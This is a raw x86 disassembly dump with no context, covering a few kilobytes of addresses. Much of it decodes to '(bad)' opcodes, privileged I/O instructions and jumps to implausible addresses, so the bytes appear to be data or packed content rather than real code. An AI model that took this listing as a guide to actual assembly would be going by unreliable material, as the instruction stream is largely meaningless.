  432a20:	dec    DWORD PTR [ebx-0x257f0ff4]
  432a26:	add    DWORD PTR [edx],edx
  432a28:	add    BYTE PTR [ebp+0x50],dl
  432a2b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  432a31:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  432a37:	or     ah,al
  432a39:	pop    ss
  432a3a:	cdq    
  432a3b:	push   ebp
  432a3c:	clc    
  432a3d:	mov    eax,DWORD PTR [ebp-0x4]
  432a40:	xor    edx,edx
  432a42:	add    esi,DWORD PTR [ebx]
  432a44:	cmp    eax,DWORD PTR [ebx]
  432a46:	hlt    
  432a47:	cmp    DWORD PTR [ebx],esp
  432a49:	or     al,BYTE PTR [ebp+0xf]
  432a4c:	mov    eax,DWORD PTR [edx]
  432a4e:	loopne 0x432a50
  432a50:	(bad)  
  432a51:	mov    ecx,esi
  432a53:	cld    
  432a54:	pushf  
  432a55:	pop    ebp
  432a56:	cdq    
  432a57:	mov    esi,DWORD PTR [edx]
  432a59:	lock mov eax,eax
  432a5c:	adc    BYTE PTR [ebx],al
  432a5e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  432a65:	xor    ebp,DWORD PTR [edi+0x50e45189]
  432a6b:	dec    ebp
  432a6c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  432a72:	(bad)  
  432a73:	iret   
  432a74:	inc    ebp
  432a75:	(bad)  
  432a76:	jne    0x432ac5
  432a78:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  432a7e:	(bad)  
  432a7f:	cmp    ebx,eax
  432a81:	je     0x432a09
  432a83:	add    edi,edi
  432a85:	or     bh,bh
  432a87:	dec    ebp
  432a88:	inc    ebp
  432a89:	mov    esi,DWORD PTR [ebx]
  432a8b:	cld    
  432a8c:	add    ecx,esi
  432a8e:	cmp    ecx,DWORD PTR [eax-0xc]
  432a91:	mov    edx,DWORD PTR [edi]
  432a93:	or     BYTE PTR [ebp-0x7c],al
  432a96:	mov    ebx,DWORD PTR [ecx-0x7639cd18]
  432a9c:	test   BYTE PTR [ecx+ebx*4],cl
  432a9f:	inc    ebp
  432aa0:	xor    bh,BYTE PTR ds:0x8be89c89
  432aa6:	out    dx,eax
  432aa7:	adc    BYTE PTR [eax],al
  432aa9:	jne    0x432a72
  432aab:	mov    ebp,esp
  432aad:	fcomp  DWORD PTR [ebx]
  432aaf:	add    BYTE PTR [ecx],al
  432ab1:	inc    DWORD PTR [ebp-0x75]
  432ab4:	mov    esp,?
  432ab6:	add    al,0xce
  432ab8:	mov    ecx,edi
  432aba:	cld    
  432abb:	inc    ebp
  432abc:	fidivr WORD PTR [ebx]
  432abe:	fbstp  TBYTE PTR [ebp-0x3e]
  432ac1:	mov    eax,DWORD PTR [eax]
  432ac3:	adc    BYTE PTR [ebx-0x3974038b],cl
  432ac9:	fadd   st,st(7)
  432acb:	add    BYTE PTR [ebp-0x1],al
  432ace:	mov    ecx,DWORD PTR [esp+edi*8]
  432ad1:	inc    ebp
  432ad2:	mov    bh,0xc7
  432ad5:	loopne 0x432b1c
  432ad7:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  432add:	add    DWORD PTR [ebx],esi
  432adf:	pushf  
  432ae0:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  432ae6:	mov    eax,edi
  432ae8:	cwde   
  432ae9:	inc    ebp
  432aea:	inc    ebp
  432aeb:	jne    0x432a78
  432aed:	mov    esp,esp
  432aef:	clc    
  432af0:	add    al,0x4d
  432af2:	mov    DWORD PTR [ebx],esi
  432af4:	or     al,0x33
  432af6:	inc    ebp
  432af7:	lea    ecx,[ebx-0x398d13fd]
  432afd:	add    bh,al
  432aff:	inc    ebp
  432b00:	ror    DWORD PTR [ebx+0x45d829],0x8b
  432b07:	add    ebp,esp
  432b09:	shufps xmm1,xmm3,0xc7
  432b0d:	(bad)  
  432b0e:	jmp    0x74886637
  432b13:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  432b19:	hlt    
  432b1a:	mov    ecx,DWORD PTR [edi]
  432b1c:	fadd   DWORD PTR [ebp+0x0]
  432b1f:	xor    ecx,DWORD PTR [edi]
  432b21:	add    ecx,ecx
  432b23:	cmp    edi,edi
  432b25:	pmuludq mm7,QWORD PTR [edx+0x50]
  432b29:	(bad)  
  432b2a:	jmp    0x432ab7
  432b2c:	mov    edi,esp
  432b2e:	or     al,0xc6
  432b30:	inc    ebp
  432b31:	(bad)  
  432b32:	mov    eax,DWORD PTR [ebp+0x10]
  432b35:	jne    0x432ac0
  432b37:	mov    eax,DWORD PTR [ecx]
  432b39:	clc    
  432b3a:	add    BYTE PTR [ebp-0x40],cl
  432b3d:	xor    edx,DWORD PTR [eax-0x73]
  432b40:	jne    0x432b43
  432b42:	push   DWORD PTR [edx+0x8]
  432b45:	add    BYTE PTR [ebp+0x45],al
  432b48:	mov    ebp,ecx
  432b4a:	cld    
  432b4b:	add    BYTE PTR [ebp+0x0],cl
  432b4e:	xor    eax,DWORD PTR [ebp+0x3]
  432b51:	mov    ?,WORD PTR [ebx]
  432b53:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  432b59:	sub    eax,0x5d330e4d
  432b5e:	lea    esi,[ebx]
  432b60:	add    DWORD PTR [ebx],eax
  432b62:	jb     0x432b4d
  432b64:	add    BYTE PTR [eax],al
  432b66:	inc    ebp
  432b67:	add    bl,ch
  432b69:	inc    ebp
  432b6a:	mov    esi,DWORD PTR [ebx]
  432b6c:	or     al,0x3
  432b6e:	(bad)  
  432b6f:	mov    edi,eax
  432b71:	in     al,dx
  432b72:	scas   eax,DWORD PTR es:[edi]
  432b73:	inc    ebp
  432b74:	mov    esi,DWORD PTR [ebx]
  432b76:	in     al,0x3
  432b78:	add    al,0x89
  432b7a:	mov    ecx,DWORD PTR [eax+edi*8]
  432b7d:	dec    ebp
  432b7e:	(bad)  
  432b7f:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3167]
  432b86:	mov    ecx,eax
  432b88:	cld    
  432b89:	push   es
  432b8a:	dec    ebp
  432b8b:	add    al,0x33
  432b8d:	mov    DWORD PTR [ebx],eax
  432b8f:	in     al,dx
  432b90:	cmp    DWORD PTR [ebp-0x67],eax
  432b93:	mov    eax,DWORD PTR [ebp-0xba0068]
  432b99:	mov    edx,DWORD PTR [ebp-0x4]
  432b9c:	mov    ecx,DWORD PTR [ebp-0x2c]
  432b9f:	xor    eax,DWORD PTR [ebp+0x3]
  432ba2:	cmp    DWORD PTR [ebx],0x8b327498
  432ba8:	xor    edi,esp
  432baa:	jmp    0xff7728fc
  432baf:	add    ecx,DWORD PTR [ebp-0x3f]
  432bb2:	xor    ebx,DWORD PTR [edi]
  432bb4:	add    eax,ecx
  432bb6:	cmp    ebx,DWORD PTR [eax]
  432bb8:	mov    ecx,DWORD PTR [ebp-0x4]
  432bbb:	mov    ecx,DWORD PTR [eax]
  432bbd:	adc    BYTE PTR [ebp-0x80],al
  432bc0:	jmp    0x432bc3
  432bc2:	mov    eax,DWORD PTR [eax]
  432bc4:	cld    
  432bc5:	mov    bh,0xc6
  432bc7:	push   ecx
  432bc8:	(bad)  
  432bc9:	jne    0x432c29
  432bcb:	dec    ecx
  432bcd:	or     BYTE PTR [ecx+ebx*1],cl
  432bd0:	push   ebp
  432bd1:	inc    ebp
  432bd2:	in     al,dx
  432bd3:	add    ebp,esp
  432bd5:	or     bh,al
  432bd7:	dec    ebp
  432bd8:	cld    
  432bd9:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  432bdf:	cmp    DWORD PTR [ecx],0x2
  432be2:	pushf  
  432be3:	dec    DWORD PTR [ebx+0x45510cf4]
  432be9:	mov    DWORD PTR [ebx+0x5145fc0c],ecx
  432bef:	mov    edx,DWORD PTR [ecx+0xc]
  432bf2:	xor    eax,esi
  432bf4:	mov    edx,0xc172c7
  432bf9:	inc    ebp
  432bfa:	mov    esi,DWORD PTR [ebp+0x8]
  432bfd:	mov    eax,edx
  432bff:	call   0x84c7f2f4
  432c04:	add    DWORD PTR [ecx-0x76bace00],ebx
  432c0a:	mov    ebp,eax
  432c0c:	or     BYTE PTR [eax],dl
  432c0e:	jo     0x432c5d
  432c10:	push   edi
  432c11:	xor    esi,DWORD PTR [ebp+0x3]
  432c14:	(bad)  
  432c15:	pmulhuw mm0,mm1
  432c18:	test   DWORD PTR [ebp-0x8],ecx
  432c1b:	mov    DWORD PTR [ebp-0x67],eax
  432c1e:	mov    eax,DWORD PTR [ebp-0x4]
  432c21:	xor    edi,DWORD PTR [ebp-0x73]
  432c24:	xor    eax,DWORD PTR [ebx]
  432c26:	xor    esi,DWORD PTR [edx+0x3]
  432c29:	add    BYTE PTR [ecx],bh
  432c2b:	inc    ebp
  432c2c:	(bad)  
  432c2d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  432c33:	mov    DWORD PTR [eax],0x750f0004
  432c39:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  432c3f:	lock add BYTE PTR [ebp+0x0],cl
  432c43:	mov    esi,DWORD PTR [ebp-0x18]
  432c46:	mov    ebp,edx
  432c48:	or     al,0x72
  432c4a:	ja     0x432c4c
  432c4c:	mov    edx,esi
  432c4e:	cld    
  432c4f:	(bad)  
  432c52:	cli    
  432c53:	mov    esi,DWORD PTR [ebp-0x4]
  432c56:	cmp    ecx,esi
  432c58:	bswap  edi
  432c5a:	(bad)
  432c5e:	mov    esi,DWORD PTR [ebp-0x4]
  432c61:	mov    esi,ecx
  432c63:	clc    
  432c64:	repnz add esi,DWORD PTR [ebp+0x45]
  432c68:	push   ebx
  432c69:	xor    eax,DWORD PTR [ebp+0x3]
  432c6c:	cmp    ebx,DWORD PTR [edi-0x64]
  432c6f:	pop    ebx
  432c70:	jmp    0x432d37
  432c75:	mov    esi,DWORD PTR [ebp-0x7d]
  432c78:	xor    ebp,DWORD PTR [eax]
  432c7a:	lea    eax,[ebp-0x8]
  432c7d:	ss repnz pushf 
  432c80:	out    dx,eax
  432c81:	(bad)  
  432c82:	neg    eax
  432c84:	ins    DWORD PTR es:[edi],dx
  432c85:	test   esi,edi
  432c87:	clc    
  432c88:	pop    esp
  432c89:	inc    ebp
  432c8a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  432c90:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  432c96:	add    cl,al
  432c98:	jne    0x432c33
  432c9a:	mov    esi,DWORD PTR [edx]
  432c9c:	in     al,dx
  432c9d:	push   esi
  432c9e:	xor    BYTE PTR [ebp-0xe],dh
  432ca1:	add    edi,esi
  432ca3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  432ca9:	add    cl,bh
  432cab:	mov    edi,DWORD PTR [ebp+0x8]
  432cae:	mov    DWORD PTR [ebp-0x14],esi
  432cb1:	add    esi,DWORD PTR [ebp+0x3c]
  432cb4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  432cba:	mov    ah,0x3d
  432cbc:	cdq    
  432cbd:	pushf  
  432cbe:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  432cc4:	jne    0x432c51
  432cc6:	mov    ecx,DWORD PTR [esp+ebp*8]
  432cc9:	icebp  
  432cca:	icebp  
  432ccb:	shl    edx,0xf2
  432cce:	(bad)  
  432ccf:	mov    ah,0x16
  432cd1:	inc    eax
  432cd2:	jne    0x432c67
  432cd4:	mov    ecx,DWORD PTR [edi]
  432cd6:	in     al,dx
  432cd7:	jmp    0x432cca
  432cd9:	add    dl,dh
  432cdb:	mov    edi,esi
  432cdd:	or     al,0x8
  432cdf:	inc    ebp
  432ce0:	jne    0x432ce5
  432ce2:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  432ce8:	ret    
  432ce9:	or     bh,bh
  432ceb:	jge    0x432cd5
  432ced:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  432cf3:	xor    edi,eax
  432cf5:	add    esi,DWORD PTR [ebp-0x77]
  432cf8:	mov    ebx,esp
  432cfa:	clc    
  432cfb:	neg    DWORD PTR [ebp-0x7c]
  432cfe:	xor    eax,DWORD PTR [eax]
  432d00:	cmp    eax,DWORD PTR [eax]
  432d02:	repz jne 0x432c9a
  432d05:	xor    eax,DWORD PTR [ecx]
  432d07:	add    ebx,DWORD PTR [eax]
  432d09:	mov    DWORD PTR [ebp-0x8],eax
  432d0c:	mov    eax,edi
  432d0e:	cld    
  432d0f:	lock pop eax
  432d11:	test   DWORD PTR [ebx],esi
  432d13:	clc    
  432d14:	add    edx,DWORD PTR [edi-0x740bff77]
  432d1a:	fdivp  st(4),st
  432d1c:	test   ecx,esi
  432d1e:	(bad)  
  432d1f:	jnp    0x432d20
  432d21:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  432d27:	jae    0x432cb4
  432d29:	sub    edi,esp
  432d2b:	(bad)  
  432d2c:	shl    DWORD PTR [eax-0x3e],0x89
  432d30:	leave  
  432d31:	call   0x8198e43e
  432d36:	in     al,dx
  432d37:	(bad)  
  432d38:	in     al,dx
  432d39:	add    bh,al
  432d3b:	mov    esp,edi
  432d3d:	in     al,dx
  432d3e:	test   DWORD PTR [ebp-0x8],edi
  432d41:	mov    eax,DWORD PTR [ebp+0x2b]
  432d44:	cmp    DWORD PTR [ebx],eax
  432d46:	pushf  
  432d47:	jnp    0x57322980
  432d4d:	xor    edx,DWORD PTR [ecx-0x77]
  432d50:	push   ecx
  432d51:	loopne 0x432d86
  432d53:	jne    0x432d10
  432d55:	mov    esi,DWORD PTR [edx-0x20]
  432d58:	add    BYTE PTR [ebp-0x3d],bh
  432d5b:	xor    eax,DWORD PTR [ebp-0x73]
  432d5e:	mov    edi,DWORD PTR [esi]
  432d60:	cld    
  432d61:	jb     0x432d29
  432d63:	add    bl,al
  432d65:	jne    0x432dac
  432d67:	mov    edx,DWORD PTR [edi-0x10]
  432d6a:	jge    0x432de9
  432d6c:	mov    esi,DWORD PTR [ebx]
  432d6e:	lock add ecx,DWORD PTR [ebp+0x3b]
  432d72:	xor    esi,DWORD PTR [ebp-0x77]
  432d75:	mov    esi,eax
  432d77:	lock inc ebp
  432d79:	jge    0x432db1
  432d7b:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  432d82:	dec    ebp
  432d83:	mov    esi,DWORD PTR [ebx]
  432d85:	loopne 0x432d10
  432d87:	jge    0x432d81
  432d89:	add    DWORD PTR [ebp-0x7d],eax
  432d8c:	test   BYTE PTR [edx],0x9c
  432d8f:	dec    ebp
  432d90:	mov    esi,DWORD PTR [ebp-0xc]
  432d93:	mov    ecx,DWORD PTR [ebp-0xc]
  432d96:	xor    ebx,DWORD PTR [ebp-0x77]
  432d99:	mov    esi,esp
  432d9b:	in     al,0x45
  432d9d:	jge    0x432dd9
  432d9f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432da6:	dec    ebp
  432da7:	inc    esp
  432da8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  432dae:	inc    ebp
  432daf:	hlt    
  432db0:	ss jne 0x432d52
  432db3:	mov    edi,DWORD PTR [eax+0xf19504]
  432db9:	repnz mov DWORD PTR [ebp+0x20],ebx
  432dbd:	cmp    eax,DWORD PTR [ebp+0xf]
  432dc0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432dc4:	fistp  WORD PTR [ebx+0x0]
  432dc7:	inc    ebp
  432dc8:	mov    ebx,DWORD PTR [edi+0xc]
  432dcb:	add    eax,eax
  432dcd:	inc    ebp
  432dce:	test   BYTE PTR [ebx],dh
  432dd0:	add    eax,DWORD PTR [ebx]
  432dd2:	add    BYTE PTR [esi+0x45],bl
  432dd5:	ret    0x85
  432dd8:	jnp    0x5443b1a7
  432dde:	inc    bp
  432de0:	inc    ebp
  432de1:	ss mov ecx,0xc78a9c
  432de7:	fdiv   QWORD PTR [ebx]
  432de9:	test   DWORD PTR [ecx+0x453af8],edi
  432def:	push   ebx
  432df0:	add    edi,DWORD PTR [esi+0x708088b]
  432df6:	cmp    esi,eax
  432df8:	setns  BYTE PTR [ecx-0x74fcffce]
  432dff:	mov    esp,edi
  432e01:	call   0x33ce7353
  432e06:	or     BYTE PTR [ebx],al
  432e08:	inc    ecx
  432e09:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  432e0f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432e15:	lock add cl,al
  432e18:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  432e1f:	mov    ch,0x45
  432e21:	clc    
  432e22:	xor    eax,DWORD PTR [ebp+0x3]
  432e25:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432e2b:	inc    ebp
  432e2c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432e32:	mov    edi,eax
  432e34:	mov    eax,DWORD PTR [ebp+0x3c]
  432e37:	mov    ecx,DWORD PTR [eax]
  432e39:	hlt    
  432e3a:	inc    ebp
  432e3b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432e42:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432e48:	push   ebp
  432e49:	mov    edi,DWORD PTR [ebx]
  432e4b:	in     al,dx
  432e4c:	jne    0x432e0f
  432e4e:	mov    eax,DWORD PTR [ebp-0x28]
  432e51:	add    DWORD PTR [eax],0xe8058dec
  432e57:	clc    
  432e58:	mov    esi,DWORD PTR [edi-0x8]
  432e5b:	add    dh,dl
  432e5d:	rol    WORD PTR [ebp-0x1],cl
  432e61:	mov    edx,DWORD PTR [eax+0x8]
  432e64:	jne    0x432e26
  432e66:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432e6d:	inc    ebp
  432e6e:	push   esp
  432e6f:	test   DWORD PTR [ecx+0xf],ecx
  432e72:	sub    edx,esp
  432e74:	add    eax,DWORD PTR [eax]
  432e76:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432e7c:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  432e83:	mov    eax,DWORD PTR [ecx]
  432e85:	and    BYTE PTR [eax],al
  432e87:	cmp    BYTE PTR [eax],dl
  432e89:	add    BYTE PTR [ebp+0x66],al
  432e8c:	inc    ecx
  432e8e:	push   esp
  432e8f:	(bad)  
  432e90:	jne    0x432e92
  432e92:	push   edx
  432e93:	enterw 0xc1,0x4d
  432e98:	mov    esp,DWORD PTR [esi+0x20]
  432e9b:	add    DWORD PTR [ecx-0x7b],eax
  432e9e:	add    eax,DWORD PTR [ebx]
  432ea0:	str    WORD PTR [eax+0x45]
  432ea4:	lea    ecx,[ebx+0x45890801]
  432eaa:	sbb    BYTE PTR [ebx],al
  432eac:	dec    ebp
  432ead:	cmp    al,0xf
  432eaf:	inc    ebp
  432eb0:	push   eax
  432eb1:	mov    esi,DWORD PTR [ebx]
  432eb3:	push   eax
  432eb4:	add    eax,eax
  432eb6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  432ebd:	inc    ebp
  432ebe:	add    BYTE PTR [esi],dh
  432ec0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  432ec7:	(bad)  
  432ec8:	mov    ebx,eax
  432eca:	loopne 0x432f11
  432ecc:	dec    ebp
  432ecd:	mov    ecx,DWORD PTR [edi]
  432ecf:	cld    
  432ed0:	push   eax
  432ed1:	xchg   DWORD PTR [ebx],esi
  432ed3:	add    DWORD PTR [ebx],ebp
  432ed5:	add    BYTE PTR [ebx],ch
  432ed7:	or     BYTE PTR [ecx],bh
  432ed9:	dec    ecx
  432eda:	loopne 0x432edf
  432edc:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432ee2:	push   ebp
  432ee3:	add    DWORD PTR [ebx+0x55100800],eax
  432ee9:	dec    ebp
  432eea:	jmp    0x432e75
  432eec:	mov    esp,DWORD PTR [eax]
  432eee:	sbb    dl,dl
  432ef0:	inc    eax
  432ef1:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432ef7:	add    BYTE PTR [ebx+0x74528555],cl
  432efd:	push   ebp
  432efe:	div    DWORD PTR [ebx]
  432f00:	and    eax,DWORD PTR [ebx]
  432f02:	add    edx,DWORD PTR [edx-0x30]
  432f05:	jno    0x432e92
  432f07:	inc    DWORD PTR [eax+eiz*1]
  432f0a:	inc    ebp
  432f0b:	push   eax
  432f0c:	push   eax
  432f0d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432f13:	mov    edi,esp
  432f15:	push   eax
  432f16:	inc    ebp
  432f17:	enter  0x458b,0x8
  432f1b:	push   ecx
  432f1c:	(bad)  
  432f1d:	call   0x10d38f5
  432f22:	pop    ss
  432f23:	push   ebp
  432f24:	mov    ecx,DWORD PTR [ebx+0x489408]
  432f2a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432f30:	push   ecx
  432f31:	jo     0x432f1b
  432f33:	inc    DWORD PTR [edi]
  432f35:	or     BYTE PTR [eax],al
  432f37:	call   0xce3681
  432f3c:	fmul   QWORD PTR [ebp+0x55]
  432f3f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432f45:	mov    bh,0x8c
  432f47:	adc    al,0x99
  432f49:	dec    esp
  432f4a:	xor    bl,BYTE PTR [eax]
  432f4c:	mov    ecx,DWORD PTR [ebp+0xc]
  432f4f:	mov    eax,DWORD PTR [ebp-0x4]
  432f52:	mov    esi,DWORD PTR [edi-0x3148f924]
  432f58:	push   es
  432f59:	retf   
  432f5a:	mov    BYTE PTR [ebp-0x30],0x3b
  432f5e:	inc    ebp
  432f5f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432f66:	retf   0x83fc
  432f69:	into   
  432f6a:	dec    ebp
  432f6b:	retf   
  432f6c:	mov    ecx,DWORD PTR [ebp-0x74]
  432f6f:	mov    eax,DWORD PTR [eax]
  432f71:	fdiv   QWORD PTR [ebx]
  432f73:	mov    bh,0x3
  432f75:	push   es
  432f76:	mov    esi,ecx
  432f78:	sbb    cl,dl
  432f7a:	dec    ebp
  432f7b:	sar    DWORD PTR [ebx],cl
  432f7d:	push   ebp
  432f7e:	jne    0x432f8f
  432f80:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  432f86:	lea    ebx,[eax]
  432f88:	call   0xf4ccbb4f
  432f8d:	sbb    dh,dl
  432f8f:	add    edx,ebx
  432f91:	push   ebp
  432f92:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  432f98:	push   ecx
  432f99:	mov    DWORD PTR [eax-0x30],edx
  432f9c:	test   DWORD PTR [edx],eax
  432f9e:	xadd   esp,esi
  432fa1:	pop    es
  432fa2:	add    cl,dl
  432fa4:	mov    eax,ecx
  432fa6:	or     al,0x45
  432fa8:	(bad)  
  432fa9:	push   eax
  432faa:	add    DWORD PTR [edx+0x0],eax
  432fad:	add    ecx,DWORD PTR [ecx]
  432faf:	and    dh,cl
  432fb1:	call   0xc73881
  432fb6:	add    DWORD PTR [ebp+0x0],edx
  432fb9:	mov    esp,DWORD PTR [ebp+0x18]
  432fbc:	add    BYTE PTR [eax+0x48],cl
  432fbf:	xor    eax,DWORD PTR [eax]
  432fc1:	add    esp,DWORD PTR [esi+0x3b]
  432fc4:	inc    ebp
  432fc5:	je     0x432f4a
  432fc7:	push   ecx
  432fc8:	push   es
  432fc9:	dec    ebp
  432fca:	mov    DWORD PTR [ebx],eax
  432fcc:	(bad)  
  432fcd:	or     al,0x5e
  432fcf:	inc    eax
  432fd0:	add    BYTE PTR [ebx],al
  432fd2:	data16 and BYTE PTR [ebp+0x50],al
  432fd6:	sub    DWORD PTR [ecx],0xfffffff8
  432fd9:	add    BYTE PTR [ebp-0x75],ah
  432fdc:	add    BYTE PTR [eax],bl
  432fde:	enter  0x894d,0x8b
  432fe2:	int3   
  432fe3:	loopne 0x43301f
  432fe5:	rol    BYTE PTR [eax],0x33
  432fe8:	lea    cx,[ebp+0xa]
  432fec:	data16 jb 0x433034
  432fef:	add    BYTE PTR [ebx+0x44890855],cl
  432ff5:	sbb    ah,al
  432ff7:	inc    ebp
  432ff8:	cmp    BYTE PTR [edi],cl
  432ffa:	add    BYTE PTR [edx+0x66],dl
  432ffd:	xor    ecx,DWORD PTR [eax]
  432fff:	sub    edi,esi
  433001:	mov    eax,DWORD PTR [eax]
  433003:	or     al,0x66
  433005:	ror    edx,cl
  433007:	dec    ebp
  433008:	inc    ebp
  433009:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43300f:	cld    
  433010:	or     BYTE PTR [edi+0x4501dd],dl
  433016:	ret    0xe8ce
  433019:	retf   
  43301a:	(bad)  
  43301b:	dec    ebp
  43301c:	mov    al,0x8b
  43301e:	in     al,dx
  43301f:	and    BYTE PTR [ebx],bh
  433021:	or     al,BYTE PTR [ebp+0x27]
  433024:	in     al,dx
  433025:	xchg   eax,ebp
  433027:	add    edi,eax
  433029:	add    BYTE PTR [eax+0x3f52ed55],bh
  43302f:	push   ebp
  433030:	inc    ebp
  433031:	xor    ebx,edx
  433033:	add    ebp,eax
  433035:	push   edx
  433036:	push   bp
  433038:	inc    ebp
  433039:	(bad)  
  43303a:	jmp    0xc342f693
  43303f:	sbb    al,0x33
  433041:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  433048:	add    BYTE PTR [ebp+0x44],0x8b
  43304c:	jmp    0xf98b:0x100041c8
  433053:	xor    esi,DWORD PTR [edx+0x3]
  433056:	mov    ecx,DWORD PTR [edi]
  433058:	fmul   DWORD PTR [edx]
  43305a:	add    BYTE PTR [eax],al
  43305c:	lea    eax,[ebx-0x4700273c]
  433062:	add    al,0x4f
  433064:	pop    DWORD PTR [eax]
  433066:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43306c:	push   edx
  43306d:	inc    WORD PTR [ebp+0x8]
  433071:	mov    eax,0x514f4d
  433076:	(bad)
  43307a:	add    al,al
  43307c:	xor    DWORD PTR [ebx-0x74baf730],eax
  433082:	test   DWORD PTR [esi+0x74],esp
  433085:	inc    ebp
  433086:	mov    DWORD PTR [eax+0xa4f08],edi
  43308c:	add    BYTE PTR [ecx-0x76c435bb],cl
  433092:	or     dh,cl
  433094:	or     eax,0x8b8d5045
  433099:	inc    ebp
  43309a:	mov    WORD PTR [ecx+0x3b8a00],?
  4330a0:	jne    0x4330d5
  4330a2:	mov    edi,DWORD PTR [edx+0x8f3a18]
  4330a8:	add    DWORD PTR [ebx],eax
  4330aa:	add    bh,bh
  4330ac:	adc    DWORD PTR [eax],ecx
  4330ae:	adc    DWORD PTR [ebp+0x55],edi
  4330b1:	push   es
  4330b2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4330b8:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c411da]
  4330bf:	inc    ebp
  4330c0:	mov    esp,edi
  4330c2:	or     al,0xda
  4330c4:	push   eax
  4330c5:	(bad)  
  4330c6:	jne    0x43307c
  4330c8:	call   0x3b29b7
  4330cd:	inc    ebp
  4330ce:	rol    ah,0x84
  4330d1:	call   0xbc43f7d6
  4330d6:	jne    0x4330b2
  4330d8:	mov    ebx,ebx
  4330da:	inc    edi
  4330dc:	and    al,al
  4330de:	fs jmp 0x7ec876e3
  4330e4:	bswap  ecx
  4330e6:	scas   al,BYTE PTR es:[edi]
  4330e7:	inc    esp
  4330e8:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  4330ef:	or     BYTE PTR [ebx-0x97717c6],0x83
  4330f6:	call   DWORD PTR [edi]
  4330f8:	shr    ah,0x84
  4330fb:	xchg   DWORD PTR [eax],eax
  4330fd:	add    DWORD PTR [eax],eax
  4330ff:	add    bh,bh
  433101:	dec    ebp
  433102:	and    BYTE PTR [ecx-0x38],dl
  433105:	push   eax
  433106:	dec    DWORD PTR [ebx+0xfd885]
  43310c:	mov    BYTE PTR [ebp+0x508bac00],cl
  433112:	mov    WORD PTR [ecx+0x0],ss
  433115:	lea    ecx,[ebx+0x108b20d8]
  43311b:	mov    WORD PTR [edx],ds
  43311d:	add    BYTE PTR [edi+0xff01ff],al
  433123:	mov    ecx,DWORD PTR [ebp-0x28]
  433126:	push   ecx
  433127:	shl    BYTE PTR [ebp+0x3a],0x8b
  43312b:	inc    ebp
  43312c:	in     al,0xeb
  43312e:	jno    0x4330bb
  433130:	push   edx
  433131:	mov    DWORD PTR [eax-0x28],edx
  433134:	mov    eax,DWORD PTR [ebp+0x20]
  433137:	je     0x4330c0
  433139:	mov    eax,DWORD PTR [ecx]
  43313b:	sbb    BYTE PTR [eax],al
  43313d:	pop    DWORD PTR [eax]
  43313f:	add    esi,eax
  433141:	add    bl,al
  433143:	adc    DWORD PTR [edi],esi
  433145:	jmp    0x8bce8197
  43314a:	sub    BYTE PTR [ebp+eax*2-0x63c4ca00],cl
  433151:	jne    0x4330de
  433153:	mov    ecx,DWORD PTR [eax]
  433155:	in     al,0x75
  433157:	pop    DWORD PTR [ecx+0x5101]
  43315d:	push   edx
  43315e:	inc    DWORD PTR [ebx]
  433160:	adc    BYTE PTR [ecx+0x45721cc6],cl
  433166:	add    BYTE PTR [edi+0x9],dl
  433169:	call   DWORD PTR [esi]
  43316b:	and    dl,al
  43316d:	and    bh,bh
  43316f:	inc    edi
  433171:	test   eax,edx
  433173:	sldt   ebx
  433176:	cmp    DWORD PTR [eax],eax
  433178:	pushf  
  433179:	(bad)  
  43317a:	jmp    0x433188
  43317c:	mov    eax,edi
  43317e:	or     al,0x75
  433180:	inc    eax
  433181:	call   0x432889
  433186:	mov    eax,eax
  433188:	loopne 0x43310e
  43318a:	inc    ebp
  43318b:	add    BYTE PTR [ebx+0x1451c00],cl
  433191:	mov    eax,DWORD PTR [ebp+0x20]
  433194:	add    edi,ecx
  433196:	add    BYTE PTR [eax],ch
  433198:	cmp    edi,0x18
  43319b:	test   DWORD PTR [ebp+0xf],esi
  43319e:	sbb    DWORD PTR [ecx+0x578b0020],0x20
